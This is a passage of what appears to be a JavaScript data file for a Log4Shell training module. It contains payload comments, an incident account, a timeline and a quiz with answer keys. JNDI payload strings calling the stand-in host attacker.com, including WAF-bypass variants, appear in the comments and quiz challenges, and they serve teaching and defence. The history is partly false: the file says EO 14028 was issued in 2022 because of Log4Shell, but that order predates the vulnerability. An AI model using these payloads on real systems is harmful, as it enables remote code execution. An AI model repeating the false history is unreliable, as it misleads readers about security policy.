// \${\${lower:j}ndi:ldap://attacker.com/x}   -- nested expansion
// \${jndi:ldap://127.0.0.1#attacker.com/x}  -- URL fragment bypass

// Mitigations (in order of preference)
// 1. Update to Log4j >= 2.17.1 (JNDI lookups disabled by default)
// 2. Set: log4j2.formatMsgNoLookups=true
// 3. Remove JndiLookup.class from classpath (emergency)
// 4. Block outbound LDAP/RMI from application servers`,
        },
      },
      incident: {
        title: "Log4Shell in Production: 72-Hour Global Crisis",
        when: "December 9 through December 12, 2021",
        where: "Global — tens of thousands of applications across every industry",
        impact: "Belgian Defense Ministry breached; Conti ransomware and Mirai botnets deployed within 24 hours of disclosure; CISA Emergency Directive in 72 hours",
        body: [
          "Log4Shell was disclosed via a public tweet and GitHub commit on December 9, 2021 — uncoordinated, without advance notification to Apache. Within 24 hours, the first production exploitation by nation-state actors (Iran's APT35) and ransomware groups was documented by Microsoft and Mandiant. The Belgian Defense Ministry was compromised. CISA published an emergency directive requiring federal agencies to patch within 72 hours.",
          "Log4j was embedded in so many Java applications as a transitive dependency that organizations discovered they were using it indirectly. Software Bill of Materials (SBOM) was a concept most organizations had never implemented — they had no inventory of their dependencies. The 2021 Biden Executive Order on Cybersecurity (EO 14028) mandated SBOMs for federal software procurement directly because of Log4Shell.",
        ],
      },
      diagram: {
        nodes: [
          { label: "JNDI Payload in HTTP Header", sub: "User-Agent / X-Forwarded-For", type: "attacker" },
          { label: "Log4j JNDI Lookup + Class Loader", sub: "LDAP -> remote class -> JVM instantiation", type: "system" },
          { label: "All Java Apps Logging User Input", sub: "CVSS 10.0; CISA emergency directive", type: "victim" },
          { label: "Log4j >= 2.17.1 + SBOM", sub: "JNDI disabled; know your dependencies", type: "result" },
        ],
      },
      timeline: [
        { year: 2021, event: "Nov 24: Alibaba Cloud privately reports Log4Shell to Apache" },
        { year: 2021, event: "Dec 9: Public disclosure via GitHub; Apache caught off-guard", highlight: true },
        { year: 2021, event: "Dec 11: CISA Emergency Directive ED-22-02; federal agencies must patch in 72h" },
        { year: 2021, event: "Dec 28: Log4j 2.17.1 released; JNDI lookups disabled entirely by default" },
        { year: 2022, event: "EO 14028 mandates SBOMs for federal software; Log4Shell cited as catalyst" },
        { year: 2024, event: "Log4Shell payloads still found in active exploit attempts in internet traffic" },
      ],
      keyTakeaways: [
        "Log4Shell demonstrates that logging user-supplied input without sanitization is an RCE vector.",
        "JNDI lookup enables arbitrary remote class loading — a design feature that became a catastrophic attack surface.",
        "Bypass variants using Log4j's nested expansion evade WAF rules matching the literal ${jndi: string.",
        "Software Bill of Materials (SBOM) is the organizational defense: knowing every dependency before a zero-day drops.",
      ],
      references: [
        { title: "CISA Log4Shell Advisory AA21-356A", url: "https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-356a" },
        { title: "NVD CVE-2021-44228 Detail", url: "https://nvd.nist.gov/vuln/detail/CVE-2021-44228" },
      ],
    },
    quiz: {
      questions: [
        {
          id: "univ-08-q1",
          type: "CVE Analysis",
          challenge: `Log4j processes the string
\${jndi:ldap://attacker.com:1389/Exploit}
from a User-Agent HTTP header.

What is the root technical mechanism that
produces remote code execution?`,
          text: "Root technical mechanism of Log4Shell RCE?",
          options: [
            "A buffer overflow in Log4j's string parsing code allows shellcode injection",
            "Log4j's JNDI lookup causes the JVM to fetch and instantiate a remote Java class",
            "Log4j's XML configuration parser executes XPath expressions in log messages",
            "Log4j passes log messages to the OS shell for formatting",
          ],
          correctIndex: 1,
          explanation: "Log4j's message lookup processes ${jndi:ldap://...} by performing a JNDI lookup, which triggers the JVM to contact the attacker's LDAP server. The LDAP response references a remote Java class, which the JVM fetches and instantiates — executing the class constructor. This is class loading, not a memory corruption vulnerability.",
        },
        {
          id: "univ-08-q2",
          type: "Bypass Evasion",
          challenge: `A WAF blocks HTTP requests containing the literal
string: \${jndi:

An attacker sends:
User-Agent: \${\${lower:j}ndi:ldap://attacker.com/x}

Does the WAF block this? What happens on the server?`,
          text: "Nested Log4j expansion bypasses the WAF — what is the mechanism?",
          options: [
            "Yes, WAF blocks it — the regex matches any JNDI variation",
            "No — Log4j evaluates \${lower:j} to 'j' before processing JNDI, after WAF inspection",
            "No — WAF only inspects POST body, not headers",
            "Yes — nested expansion is disabled in Log4j by default",
          ],
          correctIndex: 1,
          explanation: "Log4j evaluates nested lookup expressions from inside out. ${lower:j} resolves to 'j', assembling 'jndi' after the WAF has already inspected the raw string. A WAF matching only the literal ${jndi: never sees those characters together. Blocking Log4Shell at the WAF requires recursive pattern matching or, more reliably, patching the library.",
        },
        {
          id: "univ-08-q3",
          type: "Detection",
          challenge: `Security researchers needed to detect Log4Shell
vulnerability in production systems without
triggering code execution.

Which payload allows safe detection?`,
          text: "Log4Shell safe detection payload — which technique?",
          options: [
            "Full exploit payload to confirm a reverse shell connects back",
            "DNS callback: \${jndi:dns://canarytoken.com/test} triggers DNS lookup without class loading",
            "${java:version} to read the server's Java version",
            "${env:HOSTNAME} to extract server hostname from environment",
          ],
          correctIndex: 1,
          explanation: "DNS callbacks are safe: the JNDI DNS lookup generates a DNS query to the researcher's domain, confirming JNDI processing without triggering class loading (no RCE risk). Tools like Burp Collaborator and Interactsh use this for safe vulnerability detection. Full exploit payloads would cause unauthorized code execution.",
        },
        {
          id: "univ-08-q4",
          type: "Organizational Defense",
          challenge: `During Log4Shell, organizations spent weeks
discovering which of their systems used Log4j —
often buried as a transitive dependency.

Which organizational practice would most have
accelerated this identification?`,
          text: "What organizational practice would have most accelerated Log4Shell response?",
          options: [
            "Real-time vulnerability scanning with commercial tools",
            "Software Bill of Materials (SBOM) — machine-readable inventory of all dependencies",
            "Penetration testing conducted within 6 months of disclosure",
            "Network segmentation preventing lateral movement after exploitation",
          ],
          correctIndex: 1,
          explanation: "Log4j was frequently a transitive dependency — included by third-party libraries, not directly by the application. Without SBOMs, organizations had no systematic way to find all Log4j instances. The 2021 Biden Executive Order (EO 14028) mandated SBOMs for federal software procurement directly because of Log4Shell's SBOM lesson.",
        },
      ],
    },
  },
];
